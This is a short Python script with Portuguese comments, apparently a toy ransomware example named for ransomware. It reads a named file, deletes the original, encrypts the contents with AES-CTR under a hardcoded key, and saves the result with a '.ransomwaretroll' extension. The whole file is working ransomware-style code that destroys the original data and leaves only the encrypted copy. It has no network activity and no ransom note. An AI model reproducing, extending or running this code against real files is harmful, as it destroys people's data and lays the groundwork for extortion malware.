import os
import pyaes

## abrir o arquivo criptografado

file_name = 'teste.txt' # Nome do arquivo criptografado (mudar para o nome do arquivo criptografado)
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptação

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crpto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

new_file = file_name + ".ransomwaretroll" # Nome do arquivo criptografado
new_file = open(f'{new_file}', 'wb')
new_file.write(crpto_data)
new_file.close()
print('Arquivo criptografado com sucesso!')
